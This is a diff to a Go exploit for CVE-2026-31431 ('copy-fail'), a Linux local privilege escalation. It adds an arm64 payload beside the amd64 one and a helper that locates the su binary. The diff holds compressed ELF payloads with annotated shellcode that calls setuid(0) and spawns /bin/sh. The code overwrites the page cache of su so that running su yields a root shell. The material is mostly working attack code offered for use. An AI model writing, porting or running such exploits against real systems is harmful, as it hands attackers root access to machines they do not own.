@@ -12,6 +12,7 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 	"unsafe"
 
@@ -139,8 +140,57 @@ func printHelp() {
 	prog := os.Args[0]
 	fmt.Fprintf(os.Stderr, "Usage: %s [-h|--help]\n\n", prog)
 	fmt.Fprintf(os.Stderr, "Go implementation of CVE-2026-31431 (copy-fail).\n")
-	fmt.Fprintf(os.Stderr, "Overwrites page cache of /usr/bin/su and runs su.\n")
+	fmt.Fprintf(os.Stderr, "Overwrites the page cache of su and runs su.\n")
 	fmt.Fprintf(os.Stderr, "See https://copy.fail for for information.\n")
+}
+
+// Minimal static ELF that calls setuid(0); execve("/bin/sh", NULL, NULL); exit(0).
+// One per supported architecture, zlib-compressed for compactness.
+//
+// x86_64 ELF (160 bytes) - shellcode at file offset 0x78:
+//   31 c0           xor    eax, eax
+//   31 ff           xor    edi, edi
+//   b0 69           mov    al, 0x69        ; SYS_setuid
+//   0f 05           syscall
+//   48 8d 3d 0f..   lea    rdi, [rip+0xf]  ; "/bin/sh"
+//   31 f6           xor    esi, esi
+//   6a 3b 58        push 0x3b; pop rax     ; SYS_execve
+//   99              cdq                    ; rdx = 0
+//   0f 05           syscall
+//   31 ff           xor    edi, edi
+//   6a 3c 58        push 0x3c; pop rax     ; SYS_exit
+//   0f 05           syscall
+//
+// aarch64 ELF (172 bytes) - shellcode at file offset 0x78:
+//   d2800000        mov  x0, #0
+//   d2801248        mov  x8, #146          ; SYS_setuid
+//   d4000001        svc  #0
+//   10000100        adr  x0, sh
+//   d2800001        mov  x1, #0
+//   d2800002        mov  x2, #0
+//   d2801ba8        mov  x8, #221          ; SYS_execve
+//   d4000001        svc  #0
+//   d2800000        mov  x0, #0
+//   d2800ba8        mov  x8, #93           ; SYS_exit
+//   d4000001        svc  #0
+//   "/bin/sh\0"
+var payloadsZlibHex = map[string]string{
+	"amd64": "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3",
+	"arm64": "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578",
+}
+
+// resolveSu returns the path to the su binary. It prefers /usr/bin/su when
+// present; otherwise it walks PATH (via exec.LookPath, equivalent to which(1)).
+func resolveSu() (string, error) {
+	const fallback = "/usr/bin/su"
+	if _, err := os.Stat(fallback); err == nil {
+		return fallback, nil
+	}
+	p, err := exec.LookPath("su")
+	if err != nil {
+		return "", fmt.Errorf("su not found in PATH and not at %s: %w", fallback, err)
+	}
+	return p, nil
 }
 
 func main() {
@@ -152,22 +202,27 @@ func main() {
 		}
 	}
 
-	var payload []byte
-
-	// Original payload from https://github.com/theori-io/copy-fail-CVE-2026-31431
-	// A 160 byte linux ELF binary that:
-	// 1. Invokes the setuid(0) system call to set the user ID to root.
-	// 2. Invokes the execve system call to execute /bin/sh.
-	// 3. Exits cleanly if the execution fails.
-	payloadHex := "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
+	// Pick payload for the running architecture. The amd64 ELF is the
+	// original from https://github.com/theori-io/copy-fail-CVE-2026-31431;
+	// the arm64 ELF is an equivalent reconstructed from scratch (see the
+	// payloadsZlibHex doc comment for shellcode disassembly).
+	payloadHex, ok := payloadsZlibHex[runtime.GOARCH]
+	if !ok {
+		log.Fatalf("Unsupported architecture: %s (need amd64 or arm64)", runtime.GOARCH)
+	}
 	payloadZlib, err := hex.DecodeString(payloadHex)
 	if err != nil {
 		log.Fatalf("Invalid hex payload: %v", err)
 	}
-	payload = decompressPayload(payloadZlib)
+	payload := decompressPayload(payloadZlib)
+
+	suPath, err := resolveSu()
+	if err != nil {
+		log.Fatalf("%v", err)
+	}
 
 	// Open target file in read-only mode
-	f, err := os.Open("/usr/bin/su")
+	f, err := os.Open(suPath)
 	if err != nil {
 		log.Fatalf("Failed to open target file: %v", err)
 	}
